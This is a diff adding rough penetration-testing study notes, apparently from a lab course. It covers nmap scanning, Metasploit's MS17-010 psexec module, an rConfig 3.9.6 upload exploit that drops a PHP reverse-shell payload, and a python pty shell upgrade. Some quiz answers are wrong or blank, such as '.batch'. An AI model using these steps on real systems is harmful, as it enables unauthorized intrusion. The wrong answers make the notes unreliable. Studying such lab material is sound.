@@ -421,3 +421,66 @@ there malwares tha utilize Python3 and Linux bin to download install payload lib
 - any network request or functions executed to or from WSL instance are not parsed by Windows Firewall and Window Defender, making it a bit of a blind spot on the host
 -same issues found via PowerShell Core which can be installed on Linux operating system 
 hacker aim to use these features to avoid AV and EDR detection mechanism
+10.129.9.139 
+<test> What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')
+-> .batch
+<test> What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)
+-> search google    
+<test>  Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\
+$sudo nmap -A -v <IP>
+<result>
+
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+$msfconsole -q > use exploit/windows/smb/smb_ms17_010/psexec
+>set RHOST <targetip> set LHOST <atk IP> exploit > cat <filename>
+\\\\\\\============================================
+Infiltrating Unix/Linux
+\\Common considerations 
+benefit from considering the 
+ What distribution of Linux is the system running?
+What shell & programming languages exist on the system?
+What function is the system serving for the network environment it is on?
+What application is the system hosting?
+Are there any known vulnerabilities?
+\\Ganining a Shell Through Attacking a Vulnerable application
+$nmap -sC -sV 10.129.201.101
+> let get gaining a shell session 
+get some infor like listening on ports 80, 443, 3306 (MySQl, 21 (Ftp)) it may be safe to assume that this is a web svr hosting a web app.
+some version web stack apache 2.4.6 and PHP 7.2.34 and distribution of linux running on the sys (CentOS) 
+> let check the IP on web browser due to it show a web stack there
+rConfig management tools from the IP > a app used by network & system admin to automate the process of configurating network app.
+ex it use case would remotely configure network interface with IP addressing infr on mutiple router simul 
+=> once it atked all network infra will ruins
+\\Discovering a Vulnerability in rConfig
+> looking for its verrsion > rConfig (3.9.6) > use this infor start looking for any CVEs, Publicly available exploits and proof of concepts(PoCs)
+ex: exploit DB, rapid 7
+\\Search for an Exploit Module 
+$msf> search rConfig
+NOTE: use some search on Rapid 7 or git hub like rConfig 3.9.6 exploit metasploit github
+> search result rconfig_vendors_auth_file_upload_rce.rb > this can get us a shell on linux runing rconfig_vendors_auth_file_upload_rce but no module on MSF search
+we can copy the code from this repo onto our local atk box and save it in the dir that our local install of MSF is refer,
+$locate exploits
+/usr/share/metasploit-framwork/modules/exploits/linux/http <copy the code here>
+\\keep the msf upload to Date 
+$apt update; apt install metasploit-framwork or package manager
+\\wget or copy local anway local need file extension .rb all module MSF are in ruby
+\\Using the rConfig Exploit and Ganining a Shell
+$msf> use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+>options and input the proper setting specific network infor and lauch exploit
+We can see from the steps outlined in the exploitation process that this exploit:
+
+Checks for the vulnerable version of rConfig
+Authenticates with the rConfig web login
+Uploads a PHP-based payload for a reverse shell connection
+Deletes the payload
+Leaves us with a Meterpreter shell session
+\\Interact with the shell
+meterpreter> shell <we can drop into system shell to gain access to the target system as if we were logged in and open a terminal
+\\spawning a TTY Shell iwth PYthon 
+the default shell may be refer as non-tty shell limited func and can often prevent use of essential cmd like su and sudo
+> this because the payload was executed on the target by the apache user.
+>we can manually spawn a TTY shell using python if it presentad
+\\Interactive Python3
+$python -c 'import pty; pty.spawn("/bin/sh")'
+Whoami
+this command use python to import the pty module then uses the pty.spawn function to execute the bourne shell binary(/bin/sh) we now have a prompt (sh-4.2$) and access to more sys command to move about the system as we please
